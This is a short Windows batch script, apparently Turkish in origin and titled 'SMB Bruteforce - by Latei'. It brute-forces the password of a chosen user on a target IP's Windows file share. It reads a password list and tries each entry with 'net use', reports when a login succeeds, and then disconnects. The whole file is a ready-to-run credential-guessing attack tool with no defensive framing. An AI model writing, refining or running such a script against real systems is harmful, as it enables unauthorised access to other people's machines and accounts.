@echo off
title SMB Bruteforce - by Latei
color C
echo.
set /p ip="IP Adresi Girin: "
set /p user="Kullanıcı Adı Girin: "
set /p wordlist="PassList Girin: "

set /a count=1
for /f %%a in (%wordlist%) do (
  set pass=%%a
  call :attempt
)
echo Şifre Bulunamadı :(
pause
exit

:success
echo.
echo Şifre Bulundu! %pass%
net use \\%ip% /d /y >nul 2>&1
pause
exit

:attempt
net use \\%ip% /user:%user% %pass% >nul 2>&1
echo [ATTEMPT %count%] [%pass%]
set /a count=%count%+1
if %errorlevel% EQU 0 goto success